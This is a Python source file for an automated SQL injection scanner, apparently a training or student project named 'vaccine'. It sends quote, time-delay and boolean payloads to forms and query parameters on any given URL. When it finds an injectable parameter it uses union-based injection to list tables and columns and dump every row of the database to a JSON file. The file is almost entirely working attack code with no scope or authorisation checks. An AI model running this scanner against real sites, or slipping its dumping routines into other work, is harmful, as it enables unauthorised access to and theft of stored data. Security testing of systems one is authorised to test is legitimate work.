import re
import time
import json
from difflib import SequenceMatcher
from typing import Any
from urllib.parse import (
    ParseResult,
    urlparse,
    urlunparse,
    urljoin,
    parse_qs,
)

import requests
from requests import Response
from requests.exceptions import RequestException
from bs4 import BeautifulSoup, Tag

from vaccine.constants import BOLD, RED, GREEN, YELLOW, RESET
from vaccine.constants import HTTP_METHODS, USER_AGENT
from vaccine.constants import (
    ERROR_BASED,
    TIME_BASED,
    BOOLEAN_BASE,
    UNION_BASED,
    COLS_ERRORS,
    SYSTEM_DBS,
    START,
    END,
)


class SqliScanner:
    session = requests.Session()
    session.headers["User-Agent"] = USER_AGENT

    def __init__(
            self,
            url: str,
            method: str,
            output: str,
            cookies: str | None = None
    ) -> None:
        self._set_session_cookies(cookies)
        self._url = self.validate_url(url.strip())
        self._has_query = self.has_query_params(self._url)
        self._method = self.validate_method(method.strip())
        self._output = output
        self._db = str()
        self._db_dump = dict()

    def _sql_injection(self) -> None:
        parsed_url = urlparse(self._url)
        url = urlunparse(parsed_url[:4] + ("", "",))

        print(f"\n{GREEN}[*] Fetching forms on:{RESET} {url}")
        forms = self.get_forms(url)

        print(
            f"\n{GREEN}[*] Testing forms on:{RESET} {url}"
            f"\n{BOLD}Detected {len(forms)} form(s).{RESET}"
        )
        self._scan_forms(url, forms)

        if self._has_query:
            print(
                f"__\n\n{GREEN}[*] Testing query "
                f"parameters on:{RESET} {self._url}\n"
            )
            self._scan_query_params(url, parsed_url)

    def _scan_forms(self, url: str, forms: list[Tag]) -> None:
        for form in forms:
            details = self.get_form_details(form)
            method = details["method"]
            form_url = urljoin(url, details["action"])
            endpoint = {
                "url": form_url,
                "method": method,
            }
            print(
                f"\n{BOLD}Form {forms.index(form)+1}: "
                f"{urlparse(form_url).path}{RESET}"
            )
            for c in ["'", '"']:
                if self._db:
                    break
                data = self.get_form_data(details, c)
                self._sqli_error_based(endpoint, data, c)

            if not self._db:
                return

            payload = TIME_BASED[self._db]
            data = self.get_form_data(details, payload)
            self._sqli_time_based(endpoint, data, payload)

            true_data = self.get_form_data(details, BOOLEAN_BASE[self._db][1])
            false_data = self.get_form_data(details, BOOLEAN_BASE[self._db][0])
            self._sqli_boolean_based(endpoint, true_data, false_data)

    def _scan_query_params(self, url: str, parsed_url: ParseResult) -> None:
        query = parsed_url.query
        parsed_query = parse_qs(query)
        endpoint = {
            "url": url,
            "method": "get",
        }
        base = {k: v[0] for k, v in parsed_query.items()}
        for param in parsed_query:
            for value in parsed_query[param]:
                for c in ["'", '"']:
                    if self._db:
                        break
                    data = {**base, param: value + c}
                    self._sqli_error_based(endpoint, data, c)

                if not self._db:
                    continue

                payload = TIME_BASED[self._db]
                data = {**base, param: value + payload}
                self._sqli_time_based(endpoint, data, payload)

                true_data = {**base, param: value + BOOLEAN_BASE[self._db][1]}
                false_data = {**base, param: value + BOOLEAN_BASE[self._db][0]}
                self._sqli_boolean_based(endpoint, true_data, false_data)

    def _sqli_error_based(
            self,
            endpoint: dict[str, str],
            data: dict[str, str],
            payload: str,
    ) -> None:
        response = self._get_response(endpoint, data)
        content = response.text.lower()
        if self._is_error_vulnerable(content):
            record = {
                "type": "error-based",
                "vulnerable parameters": list(data.keys()),
                "payload": payload,
                "db": self._db,
            }
            self._archive(record)
            print(
                f"{YELLOW}[ERROR-BASED] - [{payload}] : "
                "SQL injection vulnerability detected, "
                f"logs in: {self._output}{RESET}"
            )
            if self._db_dump:
                return
            print(f"{GREEN}[*] Dumping database...{RESET}")
            clean_data = {
                key: value.strip("'\"")
                for key, value in data.items()
            }
            self._sqli_union_based(endpoint, clean_data)
        else:
            print(
                f"[ERROR-BASED] - [{payload}] : "
                "No vulnerability detected."
            )

    def _sqli_boolean_based(
            self,
            endpoint: dict[str, str],
            true_data: dict[str, str],
            false_data: dict[str, str]
    ) -> None:
        true_response = self._get_response(endpoint, true_data)
        false_response = self._get_response(endpoint, false_data)

        ratio = SequenceMatcher(
            None,
            true_response.content,
            false_response.content
        ).ratio()

        if ratio < 0.99:
            record = {
                "type": "boolean-based",
                "vulnerable parameters": list(true_data.keys()),
                "payload": BOOLEAN_BASE[self._db],
                "url": endpoint["url"],
            }
            self._archive(record)
            print(
                f"{YELLOW}[BOOLEAN-BASED] - {BOOLEAN_BASE[self._db]} "
                f"SQL injection vulnerability detected, "
                f"logs in: {self._output}{RESET}"
            )

    def _sqli_time_based(
            self,
            endpoint: dict[str, str],
            data: dict[str, str],
            payload: str
    ) -> None:
        baseline_data = {
            k: v.replace(payload, '')
            for k, v in data.items()
        }
        baseline_start = time.time()
        self._get_response(endpoint, baseline_data, timeout=8)
        baseline_delay = time.time() - baseline_start

        start = time.time()
        self._get_response(endpoint, data, timeout=8)
        delay = time.time() - start

        if delay >= baseline_delay+1:
            record = {
                "type": "time-based",
                "vulnerable parameters": list(data.keys()),
                "payload": payload,
                "url": endpoint["url"],
            }
            self._archive(record)
            print(
                f"{YELLOW}[TIME-BASED] - [{payload}] : SQL injection "
                "vulnerability detected, "
                f"logs in: {self._output}{RESET}"
            )

    def _sqli_union_based(
        self,
        endpoint: dict[str, str],
        data: dict[str, str],
    ) -> None:
        union_ctx = dict()
        union_ctx["endpoint"] = endpoint
        union_ctx["data"] = data
        if self._set_column_count(union_ctx):
            if self._find_injectable_column(union_ctx):
                self._fetch_tables(union_ctx)
                self._fetch_columns(union_ctx)
                self._dump_database(union_ctx)
                record = {
                    "type": "union-based (dump)",
                    "data": self._db_dump
                }
                self._archive(record)
                print(
                    f"{GREEN}[✔] Database dump complete.\n"
                    f"Results saved to: {self._output}{RESET}")

    def _set_column_count(self, union_ctx: dict[str, Any]) -> int:
        for key, value in union_ctx["data"].items():
            for n in range(1, 19):
                cols = ["NULL"] * n
                payload = (
                    f"{UNION_BASED[self._db]["select"]}"
                    f"{','.join(cols)} -- -")
                data = dict(union_ctx["data"])
                data[key] = f"{value}{payload}"
                response = self._get_response(union_ctx["endpoint"], data)
                content = response.text.lower()

                if COLS_ERRORS[self._db] not in content:
                    union_ctx["key"] = key
                    union_ctx["cols"] = cols
                    return 1
        return 0

    def _find_injectable_column(self, union_ctx: dict[str, Any]) -> int:
        cols_len = len(union_ctx["cols"])
        filler = "0" if self._db == "sqlite" else "NULL"
        for i in range(cols_len):
            cols = [filler] * cols_len
            cols[i] = "'vaccine'"
            payload = (
                f"{UNION_BASED[self._db]["select"]}"
                f"{','.join(cols)} -- -")
            data = dict(union_ctx["data"])
            data[union_ctx["key"]] = f"1{payload}"
            response = self._get_response(union_ctx["endpoint"], data)
            content = response.text.lower()

            if response.status_code == 200 and "vaccine" in content:
                union_ctx["cols"] = cols
                union_ctx["injec_col"] = i
                return 1
        return 0

    def _fetch_tables(self, union_ctx: dict[str, Any]) -> None:
        cols = union_ctx["cols"]
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]
        cols[injec_col] = UNION_BASED[self._db]["tables"]["expr"]
        cols[injec_col] = cols[injec_col].format(start=START, end=END)
        clause = UNION_BASED[self._db]["tables"]["from"]
        if self._db == "mysql":
            clause = clause.format(system_dbs=str(SYSTEM_DBS)[1:-1])
        payload = (
            f"{UNION_BASED[self._db]["select"]}"
            f"{','.join(cols)} "
            f"FROM {clause} -- -"
        )
        data = dict(union_ctx["data"])
        data[key] = f"1{payload}"
        response = self._get_response(union_ctx["endpoint"], data)
        content = response.text
        tables = re.findall(f"{START}(.*?){END}", content)
        tables = [t for t in tables if re.match(r'^[a-zA-Z0-9_.]+$', t)]

        union_ctx["tables"] = list()
        for table in tables:
            if self._db == "mysql":
                db, tb = table.split('.', 1)
            elif self._db == "sqlite":
                db, tb = "main", table
            union_ctx["tables"].append(tb)
            self._db_dump.setdefault(db, {})[tb] = []

    def _fetch_columns(self, union_ctx: dict[str, Any]) -> None:
        cols = union_ctx["cols"]
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]

        cols[injec_col] = UNION_BASED[self._db]["columns"]["expr"]
        cols[injec_col] = cols[injec_col].format(start=START, end=END)
        clause = UNION_BASED[self._db]["columns"]["from"]

        if self._db == "mysql":
            table_clauses = [
                (clause.format(db=db, table=tb), (db, tb))
                for db, tables in self._db_dump.items()
                for tb in tables
            ]
        elif self._db == "sqlite":
            table_clauses = [
                (clause.format(table=tb), tb)
                for tb in union_ctx["tables"]
            ]

        for clause, tb in table_clauses:
            payload = (
                f"{UNION_BASED[self._db]["select"]}"
                f"{','.join(cols)} "
                f"FROM {clause} -- -"
            )
            data = dict(union_ctx["data"])
            data[key] = f"1{payload}"
            response = self._get_response(union_ctx["endpoint"], data)
            content = response.text

            columns = re.findall(f"{START}(.*?){END}", content)
            columns = [c for c in columns if re.match(r'^[a-zA-Z0-9_]+$', c)]
            for column in columns:
                if self._db == "mysql":
                    db, tb_name = tb
                    self._db_dump[db][tb_name].append(column)
                elif self._db == "sqlite":
                    self._db_dump["main"][tb].append(column)

    def _dump_database(self, union_ctx: dict[str, Any]) -> None:
        cols = union_ctx["cols"]
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]
        for db, tables_dict in self._db_dump.items():
            for tb, cl in tables_dict.items():
                cols[injec_col] = UNION_BASED[self._db]["dump"]["expr"]
                clauses = UNION_BASED[self._db]["dump"]["from"]

                if self._db == "mysql":
                    cols[injec_col] = cols[injec_col].format(
                        start=START,
                        columns=",'|',".join(cl),
                        end=END,
                    )
                    line_count = self._get_line_count(union_ctx, db, tb)
                    clauses = [
                        clauses.format(db=db, table=tb, offset=n)
                        for n in range(line_count)
                    ]
                elif self._db == "sqlite":
                    cols[injec_col] = cols[injec_col].format(
                        start=START,
                        columns="||'|'||".join(
                            f"COALESCE({c},'')" for c in cl
                        ),
                        end=END,
                    )
                    clauses = [clauses.format(table=tb)]

                rows = list()
                for clause in clauses:
                    payload = (
                        f"{UNION_BASED[self._db]["select"]}"
                        f"{','.join(cols)} "
                        f"FROM {clause} -- -"
                    )
                    data = dict(union_ctx["data"])
                    data[key] = f"1{payload}"
                    response = self._get_response(union_ctx["endpoint"], data)
                    content = response.text
                    matches = re.findall(f"{START}(.*?){END}", content)
                    if self._db == "mysql":
                        matches = [r for r in matches if "'" not in r]
                    rows.extend(matches)

                parsed_rows = [
                    dict(zip(cl, row.split('|')))
                    for row in rows
                ]
                self._db_dump[db][tb] = {"columns": cl, "rows": parsed_rows}

    def _get_line_count(
            self,
            union_ctx: dict[str, Any],
            db: str,
            tb: str
    ) -> int:
        cols = list(union_ctx["cols"])
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]
        cols[injec_col] = f"CONCAT('{START}',COUNT(*),'{END}')"
        count_payload = (
            f"{UNION_BASED[self._db]["select"]}"
            f"{','.join(cols)} "
            f"FROM {db}.{tb} -- -"
        )
        data = dict(union_ctx["data"])
        data[key] = f"1{count_payload}"
        response = self._get_response(union_ctx["endpoint"], data)
        content = response.text.lower()
        matches = re.findall(f"{START}(.*?){END}", content)
        digits = [m for m in matches if m.isdigit()]
        if digits:
            return int(digits[0])
        return 0

    def _is_error_vulnerable(self, content: str) -> bool:
        for db, errors in ERROR_BASED.items():
            for error in errors:
                if error in content:
                    self._db = db
                    return True
        return False

    def _is_same_netloc(self, link: str) -> bool:
        if urlparse(link).netloc == urlparse(self._url).netloc:
            return True
        return False

    def _archive(self, details: dict[str, Any]) -> None:
        try:
            with open(self._output, "r") as file:
                data = json.load(file)
        except (OSError, json.JSONDecodeError):
            data = []
        data.append(details)
        with open(self._output, "w") as file:
            json.dump(data, file, indent=2)

    def _set_session_cookies(self, cookies: str | None = None) -> None:
        if cookies:
            for pair in cookies.split(";"):
                if "=" in pair:
                    k, v = pair.strip().split("=", 1)
                    self.session.cookies.set(k.strip(), v.strip())

    @staticmethod
    def get_forms(url: str) -> list[Tag]:
        try:
            res = SqliScanner.session.get(url, timeout=10).content
        except RequestException as e:
            print(
                f"{RED}[ERROR] {type(e).__name__}: "
                f"request failed for: {url}{RESET}")
            raise
        soup = BeautifulSoup(res, "html.parser")
        return soup.find_all("form")

    @staticmethod
    def get_form_details(form: Tag) -> dict[str, Any]:
        details = dict()
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = list()
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    @staticmethod
    def get_form_data(details: dict[str, Any], payload: str) -> dict[str, str]:
        data = dict()
        for input_tag in details["inputs"]:
            name = input_tag["name"]
            if name is None:
                continue
            if input_tag["type"] == "submit":
                data[name] = input_tag["value"]
            elif input_tag["type"] == "hidden" or input_tag["value"]:
                data[name] = input_tag["value"] + payload
            else:
                data[name] = f"1{payload}"
        return data

    @staticmethod
    def _get_response(
            endpoint: dict[str, str],
            data: dict[str, str],
            timeout: int = 20,
    ) -> Response:
        method = endpoint["method"]
        url = endpoint["url"]
        response = Response()
        try:
            if method == "get":
                response = SqliScanner.session.get(
                    url,
                    params=data,
                    timeout=timeout,
                )
            elif method == "post":
                response = SqliScanner.session.post(
                    url,
                    data=data,
                    timeout=timeout,
                )
        except requests.exceptions.RequestException as e:
            print(f"{type(e).__name__}: {e}")

        return response

    @staticmethod
    def has_query_params(url: str) -> bool:
        if urlparse(url).query:
            return True
        return False

    @staticmethod
    def validate_url(url: str) -> str:
        parsed = urlparse(url)
        has_value = all([parsed.scheme, parsed.netloc])

        if not has_value:
            raise ValueError(
                f"{url}: invalid URL, missing attribute(s)."
            )
        if parsed.scheme not in ["http", "https"]:
            raise ValueError(
                f"{url}: invalid scheme, "
                "expected 'http' or 'https'."
            )

        unparsed = urlunparse(parsed)
        return unparsed

    @staticmethod
    def validate_method(method: str) -> str:
        if method not in HTTP_METHODS:
            raise ValueError(
                f"{method}: invalid HTTP method, "
                "expected 'GET' or 'POST'."
            )
        return method.lower()
